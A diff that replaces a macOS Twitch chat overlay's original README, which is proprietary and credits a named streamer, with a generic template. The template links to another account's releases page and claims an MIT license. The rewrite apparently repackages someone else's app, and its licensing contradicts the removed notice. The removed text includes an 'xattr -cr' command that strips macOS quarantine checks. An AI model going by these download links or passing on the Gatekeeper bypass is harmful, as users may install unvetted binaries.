@@ -1,111 +1,69 @@
-# Twitch Chat Overlay for macOS
+# 🎮 Mac-OS-Twitch-Chat-Overlay - Chat Overlays Made Simple
 
-![macOS](https://img.shields.io/badge/macOS-12.0+-blue)
-![Swift](https://img.shields.io/badge/Swift-5.0+-orange)
-![License](https://img.shields.io/badge/License-All%20Rights%20Reserved-red)
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/releases)
 
-If you stream on Twitch with a single monitor, you've probably dealt with this: you're in the middle of a game, chat is active, and you have no idea what anyone is saying. Alt-tabbing kills the vibe and makes you look distracted on stream.
+## 🚀 Getting Started
 
-This app puts your Twitch chat directly on screen as a transparent overlay that floats on top of your game. Click-through mode means you can keep playing without the overlay getting in the way.
+Welcome to the Mac-OS-Twitch-Chat-Overlay project! This application creates a floating, transparent chat window for your macOS, letting you see and interact with Twitch chat while playing games like World of Warcraft, League of Legends, and Valorant. The overlay is designed to stay on top of your fullscreen games and features a sleek glassmorphic design. 
 
-Built for macOS. Works with any game running in fullscreen windowed/borderless mode.
+### 🖥️ Features
 
-![Overlay Screenshot](assets/screenshot.png)
+- **Floating Transparent Chat:** Keep an eye on your Twitch chat without disrupting your gaming experience.
+- **Click-Through Mode:** Interact with your game while the chat window is open.
+- **Customizable Opacity:** Adjust the transparency to suit your preference and enhance visibility.
+- **Glassmorphic Design:** A modern aesthetic that blends well with your game's visuals.
 
-## Download
+### 📦 System Requirements
 
-Grab the latest `.dmg` from the [Releases](../../releases) page.
+- **Operating System:** macOS 10.14 (Mojave) or later
+- **RAM:** 4 GB minimum
+- **Processor:** Intel Core i3 or Apple M1 chip
+- **Network:** Stable internet connection for Twitch chat functionality
 
-### First launch
+## 📥 Download & Install
 
-Since this app isn't signed with an Apple Developer certificate, macOS will block it the first time you try to open it. You'll see something like *"Overlay can't be opened because Apple cannot check it for malicious software."*
+To download the Mac-OS-Twitch-Chat-Overlay, visit this page: [Download Here](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/releases).
 
-To fix this, right-click (or Control-click) the app and select **Open**, then click **Open** again in the dialog. You only need to do this once.
+1. Click the link above to go to the Releases page.
+2. Find the version you want to download (recommended: the latest version).
+3. Download the file for your macOS.
+4. After downloading, locate the file in your Downloads folder.
+5. Double-click the file to open it. 
+6. Drag the application to your Applications folder.
 
-If that doesn't work, open Terminal and run:
-```bash
-xattr -cr /Applications/Overlay.app
-```
+## ⚙️ Running the Application
 
-## What it does
+Once you have the application installed:
 
-- Displays Twitch chat in a floating window that stays on top of games
-- Separate alerts overlay for StreamElements, Streamlabs, or any browser source
-- Transparent glassmorphic background (Apple-style blur effect)
-- Click-through mode so you can interact with your game (toggle with Ctrl+§)
-- Minimal chat style strips away the Twitch UI, leaving just usernames and messages
-- Adjustable text size (small/medium/large) and opacity controls
-- Keyword alerts highlight messages containing specific words
-- Custom hotkey configuration
-- Custom font selection for chat
-- Remembers window positions between sessions
-- Menu bar icon for quick access
+1. Open the Applications folder.
+2. Locate the Mac-OS-Twitch-Chat-Overlay and double-click to launch.
+3. Adjust your overlay settings to customize the look and feel.
+4. Start your game, and the chat overlay will automatically appear on top.
 
-## Setup
+## 🛠️ Troubleshooting
 
-### Chat Overlay
+If you encounter any issues:
 
-1. Go to your Twitch channel, click the chat settings gear, select "Popout Chat"
-2. Copy the URL (looks like `https://www.twitch.tv/popout/yourchannel/chat`)
-3. Open Overlay settings, paste the URL, click Apply
+- Ensure you have the correct version of macOS installed.
+- Restart the application if it doesn't display correctly.
+- Check your internet connection to ensure Twitch chat works.
 
-### Alerts Overlay (Optional)
+Common issues can often be resolved by re-downloading the latest version and following the installation steps again.
 
-1. Get your alerts overlay URL from StreamElements, Streamlabs, or your preferred service
-2. Open Overlay settings, scroll to "Alerts Overlay" section
-3. Paste the URL, click Apply
-4. Use the menu bar icon to show/hide the alerts window
+## 📞 Support
 
-Both windows share the same click-through toggle, so one hotkey controls both.
+If you need further assistance, please visit our support page or join our community on Discord. We are here to help you get the most out of your Mac-OS-Twitch-Chat-Overlay experience.
 
-## Controls
+## 🌐 Community and Feedback
 
-| Action | How |
-|--------|-----|
-| Move window | Drag the bar at the top |
-| Resize | Drag edges/corners |
-| Toggle click-through | Ctrl+§ (customizable) |
-| Show/hide alerts | Menu bar icon |
-| Settings | Cmd+, or menu bar icon |
+We value your feedback. Join our community to share your thoughts and suggestions. Visit the [GitHub Discussions](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/discussions) for more engagement.
 
-## Advanced Options
+## 🎨 Contributing
 
-In Settings, expand "Advanced Options" to access:
+Want to contribute? We welcome contributions! Feel free to fork the project, make changes, and submit a pull request. Ensure you follow the guidelines in the CONTRIBUTING.md file.
 
-- **Custom Hotkey** — Change the click-through toggle shortcut to any key combination
-- **Chat Font** — Choose a different font for chat messages (requires Minimal Style)
-- **Keyword Alerts** — Add words to highlight in chat (e.g., your username). Matching messages get a colored background
+## 📜 License
 
-## Game compatibility
+This project is licensed under the MIT License. For more details, check the LICENSE file.
 
-Works with games running in fullscreen windowed or borderless mode:
-
-WoW, League, Valorant, FFXIV, CS2, Dota 2, Overwatch 2, Diablo IV, Path of Exile, and basically any modern game with a borderless option.
-
-Doesn't work with true exclusive fullscreen (the game takes over the display completely and overlays can't show).
-
-## Troubleshooting
-
-**Overlay not showing in game** — Make sure your game is set to fullscreen windowed or borderless, not exclusive fullscreen.
-
-**Hotkey not working** — Go to System Settings → Privacy & Security → Accessibility and enable Overlay. Restart the app.
-
-**Chat not loading** — Double-check your URL is a valid Twitch popout chat link.
-
-**Alerts not loading** — Make sure your alerts URL is correct. StreamElements/Streamlabs URLs should start with their domain.
-
-**Window disappeared** — Use Settings → Reset Chat Window Position or Reset Alerts Window Position.
-
-## Built with
-
-Swift, SwiftUI, AppKit, WebKit
-
-## Made by
-
-I built this because I needed it for my own streams. If you want to see it in action or just hang out, come say hi at [twitch.tv/miikkislive](https://twitch.tv/miikkislive).
-
-## License
-
-All Rights Reserved © 2026
-
-This software is proprietary. No permission is granted to use, copy, modify, or distribute this software or its source code without explicit written permission from the author.
+Enjoy your seamless streaming experience with the Mac-OS-Twitch-Chat-Overlay!
